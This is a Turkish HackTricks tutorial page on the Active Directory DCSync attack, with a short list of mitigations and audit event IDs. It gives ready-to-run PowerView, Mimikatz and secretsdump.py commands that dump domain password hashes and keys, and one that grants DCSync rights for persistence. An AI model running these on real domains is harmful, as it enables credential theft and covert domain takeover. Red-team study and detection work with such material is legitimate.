# DCSync

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatikleştirilmiş iş akışları** oluşturun ve kolayca kullanın.\
Hemen Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## DCSync

**DCSync** izni, etki alanı üzerinde şu izinlere sahip olmayı ima eder: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** ve **Replicating Directory Changes In Filtered Set**.

**DCSync Hakkında Önemli Notlar:**

* **DCSync saldırısı, bir Etki Alanı Denetleyicisinin davranışını taklit eder ve diğer Etki Alanı Denetleyicilerinden bilgiyi replike etmelerini ister**. Bu, Dizin Replikasyon Hizmeti Uzak Protokolü (MS-DRSR) kullanılarak gerçekleştirilir. MS-DRSR, Active Directory'nin geçerli ve gerekli bir işlevi olduğundan devre dışı bırakılamaz veya devre dışı bırakılamaz.
* Varsayılan olarak sadece **Etki Alanı Yöneticileri, Kurumsal Yöneticiler, Yöneticiler ve Etki Alanı Denetleyicileri** grupları gerekli ayrıcalıklara sahiptir.
* Eğer herhangi bir hesap şifresi tersine çevrilebilir şifreleme ile saklanıyorsa, Mimikatz'da şifreyi düz metin olarak geri döndürme seçeneği bulunmaktadır

### Numaralandırma

Bu izinlere kimin sahip olduğunu `powerview` kullanarak kontrol edin:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Yerel Sömürü
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Uzaktan Sömürü
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 3 dosya oluşturur:

* biri **NTLM karmaları** ile
* biri **Kerberos anahtarları** ile
* NTDS'den açık metin parolaları içeren bir dosya, [**tersine çevrilebilir şifreleme**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmiş hesaplar için. Tersine çevrilebilir şifreleme ile ayarlanmış hesapları alabilirsiniz:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Kalıcılık

Eğer bir etki alanı yöneticisiyseniz, `powerview` yardımıyla bu izinleri herhangi bir kullanıcıya verebilirsiniz:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Sonra, kullanıcının doğru şekilde atanıp atanmadığını kontrol edebilirsiniz, bunları (ayrıcalıkların adlarını "ObjectType" alanı içinde görebilmelisiniz) çıktıda arayarak kontrol edin:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Azaltma

* Güvenlik Olay Kimliği 4662 (Nesne için denetim politikası etkin olmalıdır) - Bir nesne üzerinde işlem yapıldı
* Güvenlik Olay Kimliği 5136 (Nesne için denetim politikası etkin olmalıdır) - Bir dizin hizmeti nesnesi değiştirildi
* Güvenlik Olay Kimliği 4670 (Nesne için denetim politikası etkin olmalıdır) - Bir nesne üzerinde izinler değiştirildi
* AD ACL Tarayıcı - ACL'lerin oluşturulması ve karşılaştırılması için raporlar oluşturun. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referanslar

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
* [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

<details>

<summary><strong>Sıfırdan başlayarak AWS hacklemeyi</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerine göz atın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
